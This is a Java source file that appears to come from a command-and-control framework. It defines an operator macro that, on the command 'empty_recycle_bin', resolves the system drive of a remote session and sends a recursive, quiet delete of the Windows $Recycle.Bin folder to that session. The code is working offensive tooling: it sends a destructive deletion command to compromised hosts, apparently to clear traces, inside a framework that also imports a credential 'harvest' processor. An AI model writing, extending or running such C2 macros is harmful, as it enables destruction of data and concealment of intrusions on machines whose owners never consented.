package c2.session.macro;

import c2.HarvestProcessor;
import c2.session.IOManager;
import c2.win.WindowsCmdLineHelper;

public class RecycleBinCleanMacro extends AbstractCommandMacro{

	public static final String COMMAND = "empty_recycle_bin";
	
	private IOManager io;
	
	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equalsIgnoreCase(COMMAND);
	}

	@Override
	public void initialize(IOManager io, HarvestProcessor harvestProcessor) {
		this.io = io;
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		try {
			String directory = WindowsCmdLineHelper.resolveVariableDirectory(io, sessionId, "%systemdrive%");
			String command = "del /s /q " + directory + "\\$Recycle.Bin";
			outcome.addSentCommand(command);
			io.sendCommand(sessionId, command);
			String response = io.awaitMultilineCommands(sessionId);
			outcome.addResponseIo(response);
			outcome.addMacroMessage("Recycle bin emptied");
		}catch(Exception ex) {
			outcome.addError("Unable to resolve system drive");
		}
		
		return outcome;
	}

}
